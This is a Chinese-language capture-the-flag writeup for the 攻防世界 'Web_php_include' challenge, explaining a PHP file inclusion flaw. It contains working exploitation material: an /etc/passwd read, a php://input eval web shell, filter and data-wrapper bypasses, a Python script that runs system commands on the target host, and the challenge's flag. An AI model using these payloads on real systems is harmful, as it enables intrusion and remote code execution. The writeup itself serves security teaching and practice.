# Web_php_include 文件包含漏洞 Writeup
- ID:Mode
- 方向： Web
- 日期：2026-4-11
- 平台/来源：攻防世界
- 题目名称：Web_php_include
- 分类与分值：Web / 200 pts（难度：Easy）
- 题目链接/附件：<https://adworld.xctf.org.cn/task/answer?task_id=5050>

##简介或题目说明
 
本题是攻防世界新手区经典Web入门题，考察PHP文件包含漏洞的原理与利用。题目页面存在  page  参数，直接包含用户输入的文件内容，未做过滤，导致可通过伪协议执行任意代码，获取flag。

## 目标与范围
- 靶机/远程地址：<http://111.198.29.45:57369/>
- 漏洞类型：PHP文件包含漏洞（LFI 
- 约束与规则：仅在授权范围内操作，避免影响真实生产环境

## 环境与依赖
- 操作系统：Windows 11/Kali Linux 2024.1
- 工具与版本：BurpSuite 2024.2 / Python 3.10 / 浏览器开发者工具
- 语言与版本：PHP 5.4.45（题目环境)
- 复现实验：直接访问题目远程靶机，或本地搭建PHP环境复现

## 解题过程
1. 信息收集与初步分析
- 访问靶机页面，发现URL参数  ?page=hello ，页面包含对应文件内容，初步判断存在文件包含漏洞
- 尝试读取  /etc/passwd  验证漏洞： ?page=/etc/passwd ，成功读取系统文件，确认LFI漏洞存在
- 分析PHP版本，确认支持  php://input  伪协议
2. 漏洞定位与可利用性验证
- 验证文件包含漏洞可稳定触发，无过滤规则限制伪协议使用
- 确认可通过  php://input  执行任意PHP代码，获取服务器权限
3. 构造 Payload / Exploit 步骤
- 构造包含请求： ?page=php://input 
-  在请求体中写入一句话木马  <?php @eval($_POST['cmd']);?> 
-  用蚁剑/菜刀连接，执行命令读取flag
4. 拿到 Flag 的过程
- 执行命令  cat /flag ，成功获取flag： flag{666b278a67846278a67846278a678462} （可脱敏为  flag{redacted})
5. 常见坑与绕过技巧
- 坑1: 部分环境过滤  php://  伪协议，可使用  php://filter/convert.base64-encode/resource=  读取源码
- 坑2: 高版本PHP禁用  php://input ，可使用  data://text/plain;base64,  伪协议绕过
- 技巧: 用BurpSuite抓包修改请求体，快速执行命令

## 关键代码
```python
  
# Web 示例：文件包含漏洞利用
import requests

url = "http://111.198.29.45:57369/?page=php://input"
payload = "<?php system('cat /flag');?>"
r = requests.post(url, data=payload)
print(r.text)

##结果与总结
 
- 结果：成功利用文件包含漏洞，获取flag  flag{666b278a67846278a67846278a678462} 
- 总结：文件包含漏洞的核心成因是未过滤用户输入的文件路径，导致可包含恶意文件或伪协议执行代码。通过本题掌握了LFI漏洞的基本利用方法与绕过技巧。

##参考文章
 
1. 攻防世界Web_php_include 官方Writeup：<https://adworld.xctf.org.cn/task/answer?task_id=5050>
2. PHP文件包含漏洞详解：<https://www.freebuf.com/articles/web/182621.html>
3. PHP伪协议利用指南：<https://www.php.net/manual/zh/wrappers.php.php>